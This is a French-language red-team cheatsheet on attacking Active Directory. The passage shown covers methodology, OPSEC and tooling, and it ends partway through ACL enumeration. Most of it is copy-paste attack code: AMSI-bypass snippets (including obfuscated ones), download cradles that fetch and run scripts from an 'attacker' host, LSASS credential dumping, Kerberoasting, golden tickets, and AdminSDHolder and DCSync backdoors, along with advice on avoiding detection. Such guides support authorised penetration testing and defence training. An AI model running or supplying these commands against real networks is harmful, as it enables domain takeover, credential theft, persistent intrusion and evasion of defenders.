---
title: "Active Directory Red Team - Guide Complet"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "Cheatsheet: Active Directory Red Team - Guide Complet"
summary: "ActiveDirectory | Active Directory Red Team - Guide Complet"
tags:
  - "Active Directory"
  - "Kerberos"
  - "Red Team"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "ActiveDirectory"
ShowToc: true
TocOpen: false

cover:
  image: "/images/covers/cheatsheet.svg"
  alt: "cheatsheet"
  relative: false
---

> **Le guide définitif pour pentest et red team operations dans environnements Active Directory**  
> **Méthodologie complète • AD Attacks • AD CS Attacks • Théorie • Défense**

---

## 📖 COMMENT UTILISER CE GUIDE

**Structure du document**:
```
1. MÉTHODOLOGIE → Kill chain, phases d'attaque, workflow
2. AD CORE ATTACKS → Domain enumeration, privilege escalation, lateral movement
3. AD CS ATTACKS → Certificate abuse, ESC1-11, persistence via PKI
4. THÉORIE → Pourquoi ces "vulnérabilités" existent (design vs exploitation)
5. DÉFENSE → Detection, mitigation, event IDs
6. QUICK REFERENCE → Commandes copy-paste, cheat sheets
```

**Navigation**:
- ✅ Sommaire cliquable avec liens vers chaque section
- ✅ Liens "Retour au sommaire" dans chaque section
- ✅ Organisation par phases d'attaque (enumeration → escalation → persistence)
- ✅ Recherche rapide: `Ctrl+F` pour trouver commandes/techniques

**Pour Pentest**:
1. Commencer par [Méthodologie](#méthodologie-red-team) pour comprendre kill chain
2. Utiliser [Quick Reference](#quick-reference) pour commandes terrain
3. Approfondir avec sections détaillées selon besoin

**Pour Apprentissage**:
1. Lire [Théorie](#théorie-pourquoi-ces-vulnérabilités-existent) pour comprendre WHY
2. Étudier [AD Core Attacks](#ad-core-attacks) et [AD CS](#ad-cs-attacks) pour HOW
3. Réviser [Défense](#défense-et-détection) pour perspective blue team

---

## 📑 TABLE DES MATIÈRES COMPLÈTE

### [🎯 MÉTHODOLOGIE RED TEAM](#méthodologie-red-team)
- [Kill Chain Active Directory](#kill-chain-active-directory)
- [Phases d'Attaque](#phases-dattaque)
- [Workflow Recommandé](#workflow-recommandé)
- [Priorités selon Objectifs](#priorités-selon-objectifs)
- [OPSEC Considerations](#opsec-considerations)

---

### [💀 PART 1: AD CORE ATTACKS](#part-1-ad-core-attacks)

#### [PHASE 0: Configuration & Tooling](#phase-0-configuration--tooling)
- [PowerShell Bypass & Obfuscation](#powershell-bypass--obfuscation)
- [Download Cradles](#download-cradles)
- [Modules Essentiels](#modules-essentiels)

#### [PHASE 1: Domain Enumeration](#phase-1-domain-enumeration)
- [1.1 Concepts AD](#11-concepts-ad)
- [1.2 Enumération Basique](#12-enumération-basique)
- [1.3 ACL Enumeration](#13-acl-enumeration)
- [1.4 BloodHound](#14-bloodhound)
- [1.5 User Hunting](#15-user-hunting)

#### [PHASE 2: Local Privilege Escalation](#phase-2-local-privilege-escalation)
- [2.1 PowerUp](#21-powerup)
- [2.2 OU Delegation Abuse](#22-ou-delegation-abuse)
- [2.3 LAPS](#23-laps)

#### [PHASE 3: Lateral Movement](#phase-3-lateral-movement)
- [3.1 Credential Dumping (Mimikatz)](#31-credential-dumping-mimikatz)
- [3.2 DCSync](#32-dcsync)
- [3.3 Pass-The-Hash](#33-pass-the-hash)
- [3.4 OverPass-The-Hash](#34-overpass-the-hash)
- [3.5 Pass-The-Ticket](#35-pass-the-ticket)

#### [PHASE 4: Domain Privilege Escalation](#phase-4-domain-privilege-escalation)
- [4.1 Kerberoast](#41-kerberoast)
- [4.2 AS-REP Roasting](#42-as-rep-roasting)
- [4.3 Unconstrained Delegation](#43-unconstrained-delegation)
- [4.4 Constrained Delegation](#44-constrained-delegation)
- [4.5 Resource-Based Constrained Delegation](#45-resource-based-constrained-delegation)
- [4.6 MS Exchange PrivExchange](#46-ms-exchange-privexchange)

#### [PHASE 5: Domain Persistence](#phase-5-domain-persistence)
- [5.1 Golden Ticket](#51-golden-ticket)
- [5.2 Silver Ticket](#52-silver-ticket)
- [5.3 Skeleton Key](#53-skeleton-key)
- [5.4 DSRM](#54-dsrm)
- [5.5 Custom SSP](#55-custom-ssp)
- [5.6 AdminSDHolder](#56-adminsdholder)
- [5.7 DCSync Rights](#57-dcsync-rights)

#### [PHASE 6: Cross-Domain Attacks](#phase-6-cross-domain-attacks)
- [6.1 AD CS Cross-Domain](#61-ad-cs-cross-domain)
- [6.2 Trust Tickets](#62-trust-tickets)
- [6.3 KRBTGT Method](#63-krbtgt-method)

#### [PHASE 7: Cross-Forest Attacks](#phase-7-cross-forest-attacks)
- [7.1 SID Filtering](#71-sid-filtering)
- [7.2 Trust Abuse](#72-trust-abuse)
- [7.3 Foreign Security Principals](#73-foreign-security-principals)
- [7.4 SQL Server Links](#74-sql-server-links)

#### [PHASE 8: PAM Trust Abuse](#phase-8-pam-trust-abuse)
- [8.1 Shadow Principals](#81-shadow-principals)

---

### [🔐 PART 2: AD CS ATTACKS](#part-2-ad-cs-attacks)

#### [Module 0: Fondamentaux AD CS](#module-0-fondamentaux-ad-cs)
- [0.1 Introduction AD CS](#01-introduction-ad-cs)
- [0.2 Composants](#02-composants)
- [0.3 Formats Certificats](#03-formats-certificats)
- [0.4 EKUs et OIDs](#04-ekus-et-oids)

#### [Module 1: Enumération AD CS](#module-1-enumération-ad-cs)
- [1.1 Certify](#11-certify)
- [1.2 Certipy](#12-certipy)
- [1.3 Enumération Manuelle](#13-enumération-manuelle)

#### [Module 2: ESC Techniques (Privilege Escalation)](#module-2-esc-techniques)
- [2.1 ESC1 - Subject Alternative Name](#21-esc1---san)
- [2.2 ESC2 - Any Purpose EKU](#22-esc2---any-purpose)
- [2.3 ESC3 - Enrollment Agent](#23-esc3---enrollment-agent)
- [2.4 ESC4 - Template ACL Abuse](#24-esc4---template-acl)
- [2.5 ESC5 - CA ACL Abuse](#25-esc5---ca-acl)
- [2.6 ESC6 - EDITF Flag](#26-esc6---editf-flag)
- [2.7 ESC7 - ManageCA Rights](#27-esc7---manageca)
- [2.8 ESC8 - NTLM Relay HTTP](#28-esc8---ntlm-relay)
- [2.9 ESC9 - No Security Extension](#29-esc9---no-security-extension)
- [2.10 ESC10 - Weak Cert Mappings](#210-esc10---weak-mappings)
- [2.11 ESC11 - NTLM Relay RPC](#211-esc11---ntlm-relay-rpc)

#### [Module 3: THEFT Techniques](#module-3-theft-techniques)
- [3.1 THEFT1 - Export Certificates](#31-theft1---export)
- [3.2 THEFT2 - User Certs DPAPI](#32-theft2---user-dpapi)
- [3.3 THEFT3 - Machine Certs DPAPI](#33-theft3---machine-dpapi)
- [3.4 THEFT4 - Certs on Disk](#34-theft4---disk)
- [3.5 THEFT5 - UnPAC the Hash](#35-theft5---unpac)

#### [Module 4: PERSIST Techniques](#module-4-persist-techniques)
- [4.1 PERSIST1 - User Cert Renewal](#41-persist1---user)
- [4.2 PERSIST2 - Machine Cert Renewal](#42-persist2---machine)
- [4.3 PERSIST3 - Renewal Before Expiration](#43-persist3---renewal)

#### [Module 5: DPERSIST Techniques](#module-5-dpersist-techniques)
- [5.1 DPERSIST1 - Forged CA Certs](#51-dpersist1---ca-forge)
- [5.2 DPERSIST2 - Trusted Root](#52-dpersist2---trusted-root)
- [5.3 DPERSIST3 - CA Backdoor](#53-dpersist3---backdoor)

#### [Module 6: Techniques Avancées](#module-6-techniques-avancées)
- [6.1 Shadow Credentials](#61-shadow-credentials)
- [6.2 CertPotato - Local PrivEsc](#62-certpotato)
- [6.3 Code Signing](#63-code-signing)
- [6.4 EFS Abuse](#64-efs-abuse)

---

### [🔬 PART 3: THÉORIE - POURQUOI CES VULNÉRABILITÉS EXISTENT](#part-3-théorie)

#### [Chapitre 1: Fonctionnalité vs Faille](#chapitre-1-fonctionnalité-vs-faille)
- [1.1 Définitions Critiques](#11-définitions-critiques)
- [1.2 Pourquoi Cette Distinction Importante](#12-importance-distinction)

#### [Chapitre 2: Design Decisions Microsoft](#chapitre-2-design-decisions)
- [2.1 Contexte Historique](#21-contexte-historique)
- [2.2 Besoins Métier Légitimes](#22-besoins-métier)
- [2.3 Philosophie Compatibilité First](#23-compatibilité-first)

#### [Chapitre 3: Kerberos Delegation - Cas d'École](#chapitre-3-kerberos-delegation)
- [3.1 Le Besoin Métier Réel](#31-besoin-métier-delegation)
- [3.2 Unconstrained Delegation](#32-unconstrained-delegation-design)
- [3.3 Constrained Delegation](#33-constrained-delegation-design)
- [3.4 RBCD](#34-rbcd-design)
- [3.5 Pourquoi Microsoft Ne "Fixe" Pas](#35-pourquoi-pas-fixé)

#### [Chapitre 4: Trusts - Collaboration vs Escalation](#chapitre-4-trusts)
- [4.1 Pourquoi Les Trusts Existent](#41-trusts-pourquoi)
- [4.2 Parent-Child Trust](#42-parent-child-trust)
- [4.3 Forest Trust](#43-forest-trust)
- [4.4 Trust Key Mechanism](#44-trust-key)

#### [Chapitre 5: AD CS Design](#chapitre-5-ad-cs-design)
- [5.1 Pourquoi AD CS Créé](#51-ad-cs-pourquoi)
- [5.2 Certificate Templates Flexibilité](#52-templates-flexibilité)
- [5.3 ESC1 - Design Intention](#53-esc1-design)
- [5.4 ESC3 - Enrollment Agent Need](#54-esc3-enrollment-agent)
- [5.5 ESC8 - Web Enrollment](#55-esc8-web-enrollment)

#### [Chapitre 6: ACLs et Complexity](#chapitre-6-acls)
- [6.1 Granularité Maximum](#61-acls-granularité)
- [6.2 AdminSDHolder Paradox](#62-adminsdholder)

#### [Chapitre 7: NTLM Legacy](#chapitre-7-ntlm)
- [7.1 Pourquoi NTLM Existe Encore](#71-ntlm-encore)
- [7.2 Design Flaws](#72-ntlm-flaws)
- [7.3 Pourquoi Pas Désactivé](#73-ntlm-pas-désactivé)

---

### [🛡️ PART 4: DÉFENSE ET DÉTECTION](#part-4-défense-et-détection)

#### [Détection AD](#détection-ad)
- [Event IDs Critiques AD](#event-ids-ad)
- [Protected Users Group](#protected-users)
- [MDI (Microsoft Defender for Identity)](#mdi)

#### [Détection AD CS](#détection-ad-cs)
- [Event IDs AD CS](#event-ids-ad-cs)
- [Template Hardening](#template-hardening)
- [CA Protection](#ca-protection)

#### [Prévention](#prévention)
- [Tiering Model](#tiering-model)
- [PAWs](#paws)
- [LAPS Deployment](#laps-deployment)
- [JIT/JEA](#jitjea)

---

### [⚡ PART 5: QUICK REFERENCE](#part-5-quick-reference)

#### [Commandes AD par Phase](#commandes-ad-par-phase)
- [Enumération](#ref-enumération)
- [Credentials](#ref-credentials)
- [Kerberos](#ref-kerberos)
- [Delegation](#ref-delegation)
- [Persistence](#ref-persistence)

#### [Commandes AD CS](#commandes-ad-cs)
- [Enumération](#ref-adcs-enum)
- [ESC Exploits](#ref-esc-exploits)
- [THEFT](#ref-theft)
- [Persistence](#ref-adcs-persistence)

#### [Outils](#outils-référence)
- [PowerShell Tools](#powershell-tools)
- [C# Tools](#csharp-tools)
- [Python Tools](#python-tools)

#### [One-Liners Critiques](#one-liners)

---

# MÉTHODOLOGIE RED TEAM

## Kill Chain Active Directory

```
┌─────────────────────────────────────────────────────────────┐
│                    AD RED TEAM KILL CHAIN                    │
└─────────────────────────────────────────────────────────────┘

1. INITIAL ACCESS (Assumed Breach)
   └─> Compromised user account or workstation

2. ENUMERATION
   ├─> Domain Mapping (Get-Domain*)
   ├─> BloodHound Collection
   ├─> ACL Enumeration
   └─> AD CS Discovery (si présent)

3. CREDENTIAL ACCESS
   ├─> LSASS Dump (Mimikatz, alternatives)
   ├─> DCSync (si DA/Replication rights)
   ├─> Kerberoasting
   ├─> AS-REP Roasting
   └─> DPAPI Secrets

4. PRIVILEGE ESCALATION
   ├─> Local: PowerUp, OU Delegation
   ├─> Domain: Delegation abuse, ACL abuse
   ├─> AD CS: ESC1-11
   └─> Cross-Domain: Trust abuse

5. LATERAL MOVEMENT
   ├─> PTH/OPTH/PTT
   ├─> PSRemoting
   ├─> WMI/DCOM
   └─> RDP

6. DOMAIN DOMINANCE
   ├─> Domain Admin
   ├─> Enterprise Admin (multi-domain)
   └─> DCSync all accounts

7. PERSISTENCE
   ├─> Golden/Silver Tickets
   ├─> Skeleton Key
   ├─> AdminSDHolder backdoor
   ├─> Certificates (AD CS)
   └─> DSRM password

8. EXFILTRATION & IMPACT
   ├─> Dump NTDS.dit
   ├─> Sensitive data exfil
   └─> Maintain access
```

---

## Phases d'Attaque

### Phase 1: Initial Recon (Stealth)
```
Objectif: Comprendre l'environnement sans alerter défenseurs
Durée: 1-3 jours
Tools: AD Module (Microsoft-signed), LDAP queries passives

Actions:
✅ Enumérer domain structure (OUs, groups, computers)
✅ Identifier high-value targets (DAs, sensitive servers)
✅ Map trusts (child/parent, forest)
✅ Check AD CS presence
✅ BloodHound collection (méthode la moins bruyante)

OPSEC:
🟢 Utiliser AD Module vs PowerView (moins détecté)
🟢 Queries LDAP distribuées dans le temps
🟢 Éviter mass scanning
🔴 BloodHound SharpHound = bruyant (thousands LDAP queries)
```

### Phase 2: Credential Hunting (Active)
```
Objectif: Obtenir credentials privilégiés
Durée: 2-5 jours
Tools: Mimikatz, Rubeus, Kerberoast tools

Actions:
✅ Kerberoast tous SPNs
✅ AS-REP Roast users sans preauth
✅ Dump LSASS sur hosts compromised
✅ Search file shares pour credentials
✅ DPAPI secrets extraction

OPSEC:
🟡 Kerberoast = détectable (RC4 encryption downgrade)
🟡 LSASS dump = EDR alert possible
🟢 AS-REP Roast = stealthy (offline attack)
🔴 Mass Kerberoasting = très bruyant
```

### Phase 3: Privilege Escalation (Critical)
```
Objectif: Domain Admin ou equivalent
Durée: Variable (minutes à jours)
Méthodes par priorité:

1. ACL Abuse (si GenericAll/WriteProperty trouvé)
   → Modify object, reset password, Shadow Credentials
   
2. Delegation Abuse
   → Unconstrained (si DA se connecte)
   → Constrained (S4U impersonation)
   → RBCD (si GenericWrite sur computer)

3. AD CS Exploitation (si présent)
   → ESC1 (SAN abuse) = quick win
   → ESC8 (NTLM relay) = si coercion possible
   → ESC3 (enrollment agent) = puissant

4. Trust Exploitation (cross-domain)
   → Child to Parent via SID injection
   → Forest trust abuse (si SID filtering disabled)

OPSEC:
🔴 Certaines méthodes = très bruyantes (Printer Bug coercion)
🟢 S4U attacks = relativement stealthy
🟡 AD CS = dépend méthode
```

### Phase 4: Persistence (Long-term)
```
Objectif: Maintenir accès même après remediation
Durée: 1-2 heures setup
Méthodes multiples recommandées:

Tier 1 - Stealthy:
✅ Certificate persistence (AD CS) - MEILLEUR
✅ AdminSDHolder backdoor ACL
✅ DCSync rights via ACL

Tier 2 - Moderate:
✅ Golden Ticket (KRBTGT hash)
✅ DSRM password sync

Tier 3 - Detectable:
✅ Skeleton Key (requires kernel driver)
✅ Custom SSP (DLL injection LSASS)

OPSEC:
🟢 Certificates = très stealthy, longue durée
🟢 AdminSDHolder = ACLs rarement audités  
🟡 Golden Ticket = logs si mal utilisé
🔴 Skeleton Key = Service installation event
```

---

## Workflow Recommandé

### Jour 1: Reconnaissance
```bash
# 1. Initial enumeration (AD Module)
Import-Module ActiveDirectory
Get-ADDomain
Get-ADForest
Get-ADTrust -Filter *
Get-ADOrganizationalUnit -Filter *

# 2. Check AD CS
certutil -ping
Certify.exe cas

# 3. BloodHound (selective mode)
SharpHound.exe -c DCOnly --OutputPrefix "initial"

# 4. Review results, plan next steps
```

### Jour 2-3: Credential Hunting
```powershell
# 1. Kerberoasting (ciblé)Get-DomainUser -SPN | Select samaccountname,serviceprincipalname

# 2. Request TGS
Add-Type -AssemblyName System.IdentityModel
foreach($user in $spnUsers) {
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $user.ServicePrincipalName
}

# 3. Export tickets
Invoke-Mimikatz -Command '"kerberos::list /export"'

# 4. Crack offline (hashcat, john)
hashcat -m 13100 tickets.txt wordlist.txt

# AS-REP Roasting
Get-DomainUser -PreauthNotRequired | Select samaccountname
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

### Jour 4-5: Escalation
```powershell
# Analyze BloodHound paths
# Neo4j: MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Exploit selon path trouvé:

# Si ACL abuse:
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# Si Delegation:
Rubeus.exe s4u /user:constrained_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/dc.domain.local /ptt

# Si AD CS:
Certify.exe find /vulnerable
certipy req -u 'user@domain.local' -p 'password' -ca 'CA' -template 'VulnTemplate' -upn 'administrator@domain.local'
```

### Jour 6: Persistence Setup
```powershell
# Multiple persistence mechanisms

# 1. Certificate (priority 1)
certipy req -u 'admin@domain.local' -p 'password' -ca 'CA' -template 'User'
# Exfiltrer PFX → persistence même après password reset

# 2. AdminSDHolder backdoor
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All

# 3. Golden Ticket
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt"'

# 4. DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

---

## Priorités selon Objectifs

### Objectif: Domain Admin Rapide
```
Priority Path:
1. Check BloodHound pour shortest path to DA
2. ESC1 AD CS (si template vulnérable exists)
3. Unconstrained Delegation + coercion
4. ACL abuse (GenericAll sur DA group)
5. Constrained Delegation S4U
6. Kerberoast + crack (si faible password)

Temps estimé: 2 heures - 2 jours
```

### Objectif: Persistence Long-Terme
```
Priority Path:
1. AD CS certificates (PERSIST1/2/3)
2. DPERSIST1 si CA compromise possible
3. AdminSDHolder backdoor
4. DCSync rights via ACL
5. Golden Ticket (backup)

Temps estimé: 2-4 heures setup
Durée persistence: 1-10 ans (certificats)
```

### Objectif: Stealth Maximum
```
Recommended:
✅ AD Module (vs PowerView)
✅ Kerberoasting ciblé (pas mass)
✅ AS-REP Roasting (offline)
✅ Certificate abuse (low detectability)
✅ ACL modifications (rarement monitored)

Éviter:
❌ BloodHound mass collection
❌ LSASS dumps multiples
❌ Skeleton Key (driver installation)
❌ Noisy coercion (PrinterBug mass)
❌ Mass Kerberoasting
```

### Objectif: Cross-Forest Access
```
Priority Path:
1. Enumerate trusts (Get-ADTrust)
2. Si SID filtering disabled → SID injection
3. Si AD CS cross-forest → certificate abuse
4. SQL Server links crawling
5. Foreign Security Principals abuse

Temps estimé: 1-3 jours
```

---

## OPSEC Considerations

### Niveaux de Bruit

**🟢 LOW NOISE (Recommandé production)**:
```
✅ AD Module LDAP queries
✅ AS-REP Roasting (offline attack)
✅ Kerberoasting ciblé (1-5 SPNs)
✅ Rubeus avec AES keys (vs NTLM)
✅ Certificate-based attacks
✅ ACL modifications subtiles
✅ RBCD abuse (modern, less monitored)
```

**🟡 MEDIUM NOISE (Acceptable avec precautions)**:
```
⚠️ PowerView enumeration (repeated queries)
⚠️ BloodHound SharpHound (thousands queries)
⚠️ LSASS dumps (single, avec evasion)
⚠️ S4U attacks
⚠️ Shadow Credentials
⚠️ Kerberoasting 10-50 SPNs
```

**🔴 HIGH NOISE (Éviter si stealth requis)**:
```
❌ Invoke-ShareFinder (mass SMB scanning)
❌ Find-LocalAdminAccess (connects tous computers)
❌ Skeleton Key (kernel driver = alert)
❌ Mass Kerberoasting (100+ SPNs)
❌ Multiple LSASS dumps réseau
❌ Printer Bug mass coercion
❌ Default BloodHound collection (All)
```

### Evasion Techniques

**PowerShell Execution Policy Bypass**:
```powershell
# Method 1: Bypass flag
powershell -ep bypass

# Method 2: Download + execute
IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')

# Method 3: Encoded command
$cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('IEX (Get-Command)'))
powershell -enc $cmd

# Method 4: From stdin
Get-Content script.ps1 | powershell -nop -
```

**AMSI Bypass** (Antimalware Scan Interface):
```powershell
# Reflection method
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscation
$a='si';$b='Am';$c='Utils';$d=$b+$a+$c;
[Ref].Assembly.GetType("System.Management.Automation.$d").GetField("amsiInitFailed",'NonPublic,Static').SetValue($null,$true)
```

**Credential Dump Alternatives** (éviter Mimikatz direct):
```powershell
# Method 1: Process dump avec Windows tool
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full

# Method 2: ProcDump (Sysinternals - signé Microsoft)
procdump.exe -ma lsass.exe lsass.dmp

# Method 3: SharpDump (C#)
SharpDump.exe

# Puis parse offline avec Mimikatz ou pypykatz
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```

[↑ Retour au sommaire](#-table-des-matières-complète)

---

# PART 1: AD CORE ATTACKS

## PHASE 0: Configuration & Tooling

### PowerShell Bypass & Obfuscation

#### Execution Policy Bypass

**Contexte**: Execution Policy = protection faible (peut être bypass facilement)

**Méthodes**:
```powershell
# 1. Bypass via flag
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# 2. Bypass via process
echo "IEX (Get-Process)" | powershell -noprofile -

# 3. Download + execute direct
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"

# 4. Encoded command
$command = 'Get-Process'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand
```

#### AMSI Bypass

**AMSITrigger** - Identify portions détectées:
```powershell
# Scan script pour trouver ce qui trigger AMSI
AmsiTrigger_x64.exe -i C:\script.ps1 -f 3
```

**Bypass AMSI** (avant loader tools):
```powershell
# Classic reflection method
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscated version
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c=$b
    }
};
$d=$c.GetFields('NonPublic,Static');
Foreach($e in $d) {
    if ($e.Name -like "*Context") {
        $f=$e
    }
};
$g=$f.GetValue($null);
[IntPtr]$ptr=$g;
[Int32[]]$buf = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

#### Obfuscation Tools

**Invoke-Obfuscation**:
```powershell
# Launch interactive
Import-Module .\Invoke-Obfuscation.psd1
Invoke-Obfuscation

# Commands:
SET SCRIPTPATH C:\PowerView.ps1
TOKEN\ALL\1
OUT C:\obfuscated.ps1

# Layers of obfuscation:
# - Variable name randomization
# - String concatenation
# - Encoding
# - Reordering
```

**Manual Obfuscation Examples**:
```powershell
# Original
Invoke-Mimikatz

# Obfuscated
$cmd = "Inv" + "oke-Mim" + "ikatz"
& $cmd

# String reversal
$rev = "ztakimimI-ekovnI"
$cmd = -join ($rev.ToCharArray() | ForEach-Object {$_})[-1..-($rev.Length)]
IEX $cmd
```

---

### Download Cradles

**Method 1: WebClient**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')

# Variables
$wc = New-Object Net.WebClient
$wc.DownloadString('http://attacker/script.ps1') | IEX
```

**Method 2: Internet Explorer COM**
```powershell
$ie = New-Object -ComObject InternetExplorer.Application
$ie.Visible = $false
$ie.Navigate('http://attacker/script.ps1')
while($ie.Busy) {Start-Sleep 1}
$response = $ie.Document.body.innerHTML
$ie.Quit()
IEX $response
```

**Method 3: XMLHTTP**
```powershell
$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://attacker/script.ps1',$false)
$h.send()
IEX $h.responseText
```

**Method 4: WebRequest (.NET)**
```powershell
$wr = [System.Net.WebRequest]::Create("http://attacker/script.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

---

### Modules Essentiels

#### PowerView

**Download**:
```powershell
# From Nishang
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Local
Import-Module .\PowerView.ps1

# Dot-source (avoid Import-Module logs)
. .\PowerView.ps1
```

**Key Functions**:
- `Get-Domain*` - Enumeration
- `Find-*` - Hunting
- `Add-DomainObjectAcl` - ACL modifications
- `Get-DomainObjectAcl` - ACL enumeration
- `Invoke-Kerberoast` - Kerberoasting

#### AD Module (Microsoft)

**Load without RSAT**:
```powershell
# Download
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1')

# Import
Import-Module .\Microsoft.ActiveDirectory.Management.dll -Verbose

# Alternative: Copy from RSAT
Copy-Item C:\Windows\System32\WindowsPowerShell\v1.0\Modules\ActiveDirectory C:\Temp\
Import-Module C:\Temp\ActiveDirectory\ActiveDirectory.psd1
```

**Avantages AD Module**:
```
✅ Microsoft-signed (less detection)
✅ Native cmdlets
✅ LDAP queries standard
⚠️ Require .NET assemblies
```

#### BloodHound

**SharpHound Collection**:
```powershell
# All collection (bruyant)
.\SharpHound.exe -c All

# DCOnly (moins bruyant)
.\SharpHound.exe -c DCOnly

# Specific OU
.\SharpHound.exe -c All -d domain.local -SearchBase "OU=Servers,DC=domain,DC=local"

# Stealth mode
.\SharpHound.exe -c DCOnly --ExcludeDCs
```

**Neo4j + BloodHound GUI**:
```bash
# Start Neo4j
neo4j console

# Import JSON
# BloodHound GUI → Upload Data → Select .zip
```

**Critical Queries**:
```cypher
# Shortest paths to Domain Admins
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u

# AS-REP Roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u

# Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

# Computers with admin
MATCH p=(c:Computer)-[:AdminTo]->(c2:Computer) RETURN p

# Shortest path from owned
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
```

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## PHASE 1: Domain Enumeration

### 1.1 Concepts AD

#### Schema
- Définit classes et attributs d'objets AD
- Répliqué à tous DCs du forest
- Extensions possibles (ex: AD CS ajoute classes certificats)

#### Global Catalog (GC)
- Port 3268/3269
- Contient subset attributs de TOUS objects du forest
- Permet recherches cross-domain
- Essential pour Universal Group memberships

#### Replication
- Multi-Master replication entre DCs
- Replication intra-site: < 15 seconds
- Replication inter-site: schedule configurable
- **Abuse**: DCSync attack simule replication

#### Trust Types
- **Parent-Child**: Automatic, two-way, transitive
- **Tree-Root**: Automatic dans forest
- **Forest**: Manual, transitive (default SID filtering enabled)
- **External**: Manual, non-transitive, single domain
- **Shortcut**: Manual optimization path

---

### 1.2 Enumération Basique

#### Domain Information

**PowerView**:
```powershell
# Current domain
Get-Domain

# Specific domain
Get-Domain -Domain child.domain.local

# Domain SID
Get-DomainSID

# Domain controllers
Get-DomainController
Get-DomainController -Domain child.domain.local

# Domain policy
Get-DomainPolicy
(Get-DomainPolicy)."system access"  # Password policy
(Get-DomainPolicy)."kerberos policy"  # Kerberos settings
```

**AD Module**:
```powershell
Get-ADDomain
Get-ADDomain -Identity child.domain.local
(Get-ADDomain).DomainSID.Value
Get-ADDomainController
Get-ADDomainController -Discover -Domain child.domain.local
```

#### Users Enumeration

**PowerView**:
```powershell
# All users
Get-DomainUser
Get-DomainUser | Select samaccountname,description

# Specific user
Get-DomainUser -Identity Administrator
Get-DomainUser -Identity Administrator -Properties *

# User with SPN (Kerberoastable)
Get-DomainUser -SPN

# Users without Kerberos Preauth (AS-REP Roastable)
Get-DomainUser -PreauthNotRequired

# Users with adminCount=1 (protected)
Get-DomainUser -AdminCount

# Search description field
Get-DomainUser -LDAPFilter "Description=*password*" | Select name,description
```

**AD Module**:
```powershell
Get-ADUser -Filter *
Get-ADUser -Identity Administrator -Properties *
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
Get-ADUser -Filter {AdminCount -eq 1}
Get-ADUser -Filter "Description -like '*password*'" -Properties Description
```

#### Groups Enumeration

**PowerView**:
```powershell
# All groups
Get-DomainGroup
Get-DomainGroup | Select samaccountname

# Specific group
Get-DomainGroup -Identity "Domain Admins"

# Group members
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# User's groups
Get-DomainGroup -UserName "username"

# Admin groups
Get-DomainGroup -AdminCount
```

**AD Module**:
```powershell
Get-ADGroup -Filter *
Get-ADGroup -Identity "Domain Admins" -Properties *
Get-ADGroupMember -Identity "Domain Admins" -Recursive
Get-ADPrincipalGroupMembership -Identity username
```

#### Computers Enumeration

**PowerView**:
```powershell
# All computers
Get-DomainComputer
Get-DomainComputer | Select dnshostname,operatingsystem

# Servers only
Get-DomainComputer -OperatingSystem "*Server*"

# Windows 10
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Specific computer
Get-DomainComputer -Identity DC01

# Liveness check
Get-DomainComputer -Ping
```

**AD Module**:
```powershell
Get-ADComputer -Filter *
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
Get-ADComputer -Filter {OperatingSystem -like "*Windows 10*"}
Get-ADComputer -Identity DC01 -Properties *
```

---

### 1.3 ACL Enumeration

#### Concepts ACL

**ACL (Access Control List)**: Liste d'ACEs pour un objet
**ACE (Access Control Entry)**: Permission individuelle

**ACE Types critiques**:
- **GenericAll**: Full control
